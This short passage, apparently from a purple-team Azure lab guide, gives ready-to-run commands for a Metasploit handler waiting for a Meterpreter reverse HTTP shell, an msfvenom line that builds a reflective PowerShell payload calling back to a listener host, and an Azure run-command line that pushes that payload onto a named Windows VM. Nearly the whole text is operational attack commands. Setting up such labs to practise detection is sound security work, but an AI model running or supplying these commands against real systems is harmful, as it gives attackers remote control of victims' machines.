The following commands can be used to load up the console with the appropriate
settings to recieve a shell:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 0.0.0.0
set LPORT 8000
exploit -j
```

To stage a powershell payload you can run:

```
msfvenom -p windows/meterpreter_reverse_http LHOST=1.2.3.4 LPORT=8000 -f psh-reflection -o /tmp/payload.ps1
```

If you wish to deliver the payload via the command line you can.
If you wish to deliver the payload via a file you can use the following command:

az vm run-command invoke -g PURPLECLOUD-DEVOPS1 -n Win10-Lars --command-id RunPowerShellScript --scripts “@payload.ps1"
